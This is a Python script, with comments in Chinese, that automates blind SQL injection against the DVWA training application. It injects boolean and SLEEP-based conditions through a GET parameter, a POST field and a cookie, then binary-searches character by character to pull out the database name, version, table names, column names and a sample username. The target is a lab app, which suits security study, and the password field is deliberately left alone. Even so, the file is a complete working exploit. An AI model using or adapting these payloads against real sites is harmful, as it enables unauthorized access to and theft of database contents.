import statistics
import time

from dvwa import DVWA

SECURITY = "low"
TABLE = "users"
MODE = "all"
"""
Low: 单引号字符型, 页面区分 exists / MISSING, 没命中返回 404
Medium: 数字型, POST 提交
High: id 放在 cookie 里, 查询带 LIMIT 1, 失败还会随机 sleep
二分法逐字符取值, 一个字符大约 7 个请求.
MODE 可选 database / version / tables / columns / user / time / all.
"""

target = DVWA("sqli_blind", SECURITY)


def hit(condition):
    """发一个布尔条件, 返回是否命中."""
    if SECURITY == "low":
        payload = f"1' AND ({condition})#"
        response = target.get(
            "",
            params={"id": payload, "Submit": "Submit"},
            strict=False,
        )
    elif SECURITY == "medium":
        payload = f"1 AND ({condition})#"
        response = target.post(
            "",
            data={"id": payload, "Submit": "Submit"},
            strict=False,
        )
    else:
        payload = f"1' AND ({condition})#"
        target.session.cookies.set("id", payload)
        response = target.get("", strict=False)

    if "User ID exists in the database" in response.text:
        return True
    if (
        "User ID is MISSING from the database"
        in response.text
    ):
        return False
    raise RuntimeError("响应异常, 检查地址和会话.")


def number(expression, maximum=256):
    """二分搜索一个整数值."""
    low, high = 0, maximum
    while low < high:
        middle = (low + high) // 2
        if hit(f"({expression})>{middle}"):
            low = middle + 1
        else:
            high = middle
    return low


def text(expression, limit=64):
    """按长度和 ASCII 二分搜索字符串."""
    length = number(f"LENGTH(({expression}))", limit)
    value = ""
    for index in range(1, length + 1):
        code = number(
            f"ASCII(SUBSTRING(({expression}),{index},1))",
            126,
        )
        value += chr(code)
        print(f"  [{index}/{length}] {value}")
    return value


def database():
    print("Database:", text("DATABASE()"))


def version():
    print("Version:", text("VERSION()"))


def tables():
    base = "information_schema.tables WHERE table_schema=DATABASE()"
    count = number(f"(SELECT COUNT(*) FROM {base})", 100)
    print("Table Count:", count)
    for index in range(count):
        query = (
            f"SELECT table_name FROM {base} "
            f"ORDER BY table_name LIMIT {index},1"
        )
        print("Table:", text(query))


def columns():
    base = (
        "information_schema.columns WHERE "
        f"table_schema=DATABASE() AND table_name='{TABLE}'"
    )
    count = number(f"(SELECT COUNT(*) FROM {base})", 100)
    print(f"{TABLE} Column Count:", count)
    for index in range(count):
        query = (
            f"SELECT column_name FROM {base} "
            f"ORDER BY ordinal_position LIMIT {index},1"
        )
        print("Column:", text(query))


def sample_user():
    """取一行用户名, 不碰密码字段."""
    for col in ("user", "first_name", "last_name"):
        query = f"SELECT `{col}` FROM {TABLE} ORDER BY user_id LIMIT 0,1"
        print(f"Sample User {col}:", text(query))


def timing(delay=2):
    """对比假条件和真条件的响应时间, 只在 low 下有意义."""
    for label, predicate in (
        ("False", "1=2"),
        ("True", "1=1"),
    ):
        samples = []
        for _ in range(3):
            start = time.monotonic()
            hit(f"IF({predicate}, SLEEP({delay}), 0)=0")
            samples.append(time.monotonic() - start)
        print(
            f"{label} median: {statistics.median(samples):.2f}s"
        )
    print("差值得明显大于网络抖动才有意义.")


ACTIONS = {
    "database": database,
    "version": version,
    "tables": tables,
    "columns": columns,
    "user": sample_user,
    "time": timing,
}

for name in ACTIONS if MODE == "all" else [MODE]:
    print(f"\n=== {name} ===")
    ACTIONS[name]()
